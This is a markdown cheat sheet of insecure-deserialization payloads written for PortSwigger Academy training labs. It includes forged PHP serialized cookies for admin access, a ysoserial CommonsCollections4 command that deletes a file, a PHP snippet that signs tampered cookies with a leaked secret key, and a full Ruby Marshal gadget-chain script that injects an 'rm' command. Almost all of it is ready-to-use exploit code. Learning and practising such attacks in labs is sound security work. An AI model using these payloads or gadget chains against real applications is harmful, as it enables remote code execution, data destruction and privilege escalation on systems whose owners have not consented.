# Insecure deserialization  

>Some sample Insecure deserialization payloads for various portswigger academy labs.  

>PHP serialization format of cookie.  

```
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```  

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```  

```
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
```

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

```
java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

```
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```  

>paste code below into online ruby compiler =:> [ruby online compiler](https://www.onlinegdb.com/online_ruby_compiler)  

```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|rm /home/carlos/morale.txt")

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts
puts payload

require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)

```
  
